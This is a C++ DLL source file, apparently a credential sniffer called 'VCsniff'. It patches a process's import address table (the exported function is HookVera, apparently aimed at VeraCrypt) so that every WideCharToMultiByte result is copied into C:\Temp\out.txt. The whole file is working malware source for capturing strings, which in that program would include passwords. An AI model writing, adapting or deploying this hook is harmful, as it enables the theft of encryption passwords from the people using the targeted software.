// dllmain.cpp : Defines the entry point for the DLL application.
#include "helper.h"

#pragma comment (lib, "dbghelp.lib")

auto g_pWideCharToMultiByte = (decltype(WideCharToMultiByte)*)WideCharToMultiByte;

int HookedWideCharToMultiByte(
    UINT                               CodePage,
    DWORD                              dwFlags,
    _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
    int                                cchWideChar,
    LPSTR                              lpMultiByteStr,
    int                                cbMultiByte,
    LPCCH                              lpDefaultChar,
    LPBOOL                             lpUsedDefaultChar
)
{
    int result = g_pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);

    HANDLE hFile;
    if ((hFile = CreateFile(L"C:\\Temp\\out.txt", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
    {
        auto buffer = (char*)malloc(cbMultiByte);
        strncpy_s(buffer, cbMultiByte, lpMultiByteStr, strlen(lpMultiByteStr));
        strncat_s(buffer, cbMultiByte, "\r\n\0", 3);
        DWORD bytesWritten;
        WriteFile(hFile, buffer, strlen(buffer), &bytesWritten, NULL);
        CloseHandle(hFile);
        free(buffer);
    }

    return result;
}

EXTERN_C __MIDL_DECLSPEC_DLLEXPORT BOOL HookVera(void)
{
    OutputDebugStringA("[VCsniff] HookVera called!\n");

    ULONG size;
    DWORD i;
    BOOL found = FALSE;

    // get a HANDLE to a main module == BaseImage
    HANDLE baseAddress = GetModuleHandle(NULL);

    // get Import Table of main module
    PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToDataEx(baseAddress, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size, NULL);

    // find imports for target dll 
    for (i = 0; i < size; i++) {
        char* importName = (char*)((PBYTE)baseAddress + importTbl[i].Name);
        if (_stricmp(importName, "kernel32.dll") == 0) {
            found = TRUE;
            break;
        }
    }
    if (!found)
        return FALSE;

    // Search IAT
    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)baseAddress + importTbl[i].FirstThunk);
    while (thunk->u1.Function) {
        PROC* currentFuncAddr = (PROC*)&thunk->u1.Function;

        // found
        if (*currentFuncAddr == (PROC)g_pWideCharToMultiByte) {
            
            char buffer[50];
            snprintf(buffer, 50, "[VCsniff] Found address %p\n", *currentFuncAddr);
            OutputDebugStringA(buffer);

            // make sure memory is writable
            DWORD oldProtect = 0;
            VirtualProtect((LPVOID)currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);

            // set the hook
            *currentFuncAddr = (PROC)HookedWideCharToMultiByte;

            // revert protection setting back
            VirtualProtect((LPVOID)currentFuncAddr, 4096, oldProtect, &oldProtect);

            OutputDebugStringA("[VCsniff] Function hooked!\n");
            return TRUE;
        }
        thunk++;
    }

    return FALSE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugStringA("[VCsniff] DllMain called!\n");
        //HookVera();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

